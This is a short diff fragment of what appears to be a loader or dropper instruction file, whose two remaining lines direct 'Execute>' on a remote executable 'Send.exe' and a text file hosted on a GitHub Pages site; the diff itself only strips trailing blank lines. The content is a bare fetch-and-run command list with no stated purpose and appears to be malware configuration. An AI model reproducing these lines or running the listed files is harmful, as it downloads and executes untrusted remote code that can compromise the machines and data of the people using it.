@@ -1,6 +1,2 @@
 Execute>https://tiran132.github.io/A/Send.exe
 Execute>https://tiran132.github.io/A/do2.txt
-
-
-
-
